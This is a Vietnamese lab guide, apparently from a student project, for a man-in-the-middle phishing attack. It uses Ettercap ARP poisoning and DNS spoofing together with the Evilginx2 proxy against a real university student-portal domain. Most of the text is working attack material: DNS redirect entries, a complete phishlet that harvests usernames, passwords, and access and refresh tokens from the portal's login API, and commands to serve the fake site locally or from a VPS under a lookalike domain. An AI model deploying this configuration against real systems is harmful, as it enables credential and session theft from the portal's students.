
## TẤN CÔNG ARP POISONING KẾT HỢP VỚI EVILGINX ĐỂ LÀM PROXY TẤN CÔNG MITM - CHUẨN BỊ

- 1 MÁY KALI LINUX: IP 192.168.100.200
- 1 MÁY VICTIM: IP 192.168.100.150
- Default Gateway MẶC ĐỊNH CỦA 2 MÁY: 192.168.100.2
- 1 HOST ĐỂ UPLOAD MÃ JAVASCRIPT ĐỘC HẠI CHÈN VÀO [TÙY VÀO MỤC ĐÍCH THỰC THI CÓ CẦN INJECT JAVASCRIPT VÀO TRANG FAKE, NẾU KHÔNG CẦN BỎ QUA] [TRONG DEMO NÀY, SẼ CHÈN VÀO CUỐI CHỮ "Demo được thực hiện nhằm mục đích làm đồ án"]
- 
## TRONG MÁY KALILINUX:

```
nano /etc/ettercap/etter.dns
```
Thêm vào cuối trang:
```
thongtindaotao.sgu.edu.vn A 192.168.100.200
thongtindaotao.sgu.edu.vn PTR 192.168.100.200
```
Save lại

Bật terminal khác
```
sudo apt update && sudo apt install
```
```
wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
unzip evilginx-v3.3.0-linux-64bit.zip
```
```
cd phishlets
nano ttdt.yaml
```

```
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "thongtindaotao.daihocsaigon.edu.vn", replace: "thongtindaotao.daihocsaigon.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
  - {triggers_on: "thongtindaotao.daihocsaigon.edu.vn", orig_sub: "", domain: "thongtindaotao.daihocsaigon.edu.vn", search: "</body>", replace: "<p style="text-align: center;">Demo được thực hiện nhằm mục đích làm đồ án</p></body>", mimes: ["text/html", "application/javascript", "application/json"]}

auth_tokens:
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'access_token'
    search: '"access_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'refresh_token'
    search: '"refresh_token":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'userName'
    search: '"userName":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'name'
    search: '"name":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'expires'
    search: '".expires":"([^"]*)'
    type: 'body'
  - domain: thongtindaotao.daihocsaigon.edu.vn
    path: '/api/auth/login'
    name: 'issued'
    search: '".issued":"([^"]*)'
    type: 'body'

credentials:
  username:
    key: "username"
    search: '(.*)'
    type: 'post'
  password:
    key: "password"
    search: '(.*)'
    type: 'post'

login:
  domain: thongtindaotao.daihocsaigon.edu.vn
  path: /
```

## BẬT EVILGINX2 (Demo 1):

```
cd build
sudo ./evilginx -p ../phishlets -developer
phishlets hostname demo thongtindaotao.sgu.edu.vn
phishlets enable demo
lures create demo
lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.sgu.edu.vn LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
```

## BẬT EVILGINX2 TRÊN VPS (Demo 2):

```
sudo ./evilginx
phishlets hostname ttdt thongtindaotao.nodhsg.shop
phishlets enable ttdt
lures create ttdt
lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.nodhsg.shop LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
```

## BẬT ETTERCAP:
```ettercap -G```
QUY TRÌNH: SCAN HOST (THƯỜNG SẼ CHO RA KHOẢNG 4 HOST) --> ADD 192.168.100.150 VÀO TARGET 1 --> BẬT PLUGIN DNS SPOOF_DNS ĐỂ GỬI DNS QUERY CHO MÁY VICTIM 
KHI NÀY NGƯỜI DÙNG NẾU NHẬP thongtindaotao.sgu.edu.vn sẽ ra trang fake
